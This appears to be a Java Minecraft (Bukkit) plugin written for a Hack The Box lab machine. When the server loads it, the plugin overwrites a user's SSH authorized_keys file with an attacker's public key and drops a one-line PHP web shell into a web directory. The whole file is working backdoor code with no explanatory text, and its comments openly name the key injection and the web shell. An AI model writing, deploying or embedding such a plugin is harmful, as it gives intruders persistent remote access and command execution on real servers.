package htb.dyplesher.cfx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.FileWriter;

public class fusion extends JavaPlugin {
    @Override
    public void onEnable() {
        getLogger().info("onEnable is called!");

//Injecting SSH Key
        try {
            FileWriter file_write = new FileWriter("/home/MinatoTW/.ssh/authorized_keys");
            file_write.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtC3xSsz34olQ4a0fk6x+IqUvSCbsXE6jiM2AMyA8rY+kLoG3ekOTrToramikOd174buxFYF5hpB0jVMN2URAVchcTL1VKpqdm0jssG5nsT69IWMyaOQ8RHb6Ew4pO77y3n1y43DRd1H2HQuZPSZyOpaewROc8F7LPIVXG4h5DMFT0ZL+MYNWD6IuNxBjfrgyz2WVskvXKwSRmq6L6kcwe+1a7XOrwkrpqzoPngtg9T9WP55rXt9Hzm+yDjYFO4VbE2R+L0vCg5UUZOXnjYBniot9w/jZyyOUuqjPG3/vldAtD11t9dbc89ZtOXT7GIzZEjYbCcul3HXhV4JY3SqvAkYB58imYnt8NsLSl2AwTjiIh7VFu6BIHLvNiEjwpMAxkMSj5cXjj2JcCHhGEPRxemRQmC9Wz9PzDEercJJwtQMCAf5vRE+VZnrwIhBHPznQ+7WVQJklI7ywbh9ljc5ZOz0Ba/RAi5AI8w7Lb2QjSP1po21TsBMgNXmhta0F3f+s= root@cfx");
            file_write.close();
            getLogger().info("SSH Key Injected Successfully");
        } catch (IOException e) {
                getLogger().info("Injection Failed");
            e.printStackTrace();
        }
//Writing WebShell
        try {
            FileWriter file_write = new FileWriter("/var/www/test/cfxshell.php");
            file_write.write("<?php system($_REQUEST['cfx']); ?>");
            file_write.close();
            getLogger().info("Written Webshell Successfully");
        } catch (IOException e) {
            getLogger().info("Couldn't write Webshell");
            e.printStackTrace();
        }

    }

    @Override
    public void onDisable() {
        getLogger().info("onDisable is called!");
    }
}
